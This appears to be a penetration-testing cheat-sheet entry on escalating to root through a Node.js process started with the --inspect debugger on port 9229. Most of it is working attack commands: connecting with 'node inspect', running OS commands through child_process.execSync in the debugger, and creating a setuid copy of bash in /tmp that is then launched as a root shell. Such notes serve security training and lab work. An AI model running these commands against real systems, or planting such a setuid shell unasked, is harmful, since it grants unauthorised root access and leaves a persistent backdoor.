NodeJS (TCP/9229)

Node.js® is a free, open-source, cross-platform JavaScript runtime environment that lets developers create servers, web apps, command line tools and scripts

Privilege escalation

    When nodejs is started with the --inspect switch, a Node.js process listens for a debugging client. By default, it will listen at host and port 127.0.0.1:9229. Each process is also assigned a unique UUID. An example of nodejs runing like said is:

    root        1328  0.0  1.1 1066456 46380 ?       Ssl  09:26   0:01 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js

    We can access the console by typing

    node inspect 127.0.0.1:9229

    Once inside we can use the following command to execute any OS command and since the nodejs is running as root the command will be executed as a superuser

    debug> exec("process.mainModule.require('child_process').execSync('whoami').toString()")

    Or we can use

    debug> exec("process.mainModule.require('child_process').execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash').toString()")
/tmp/rootbash -p
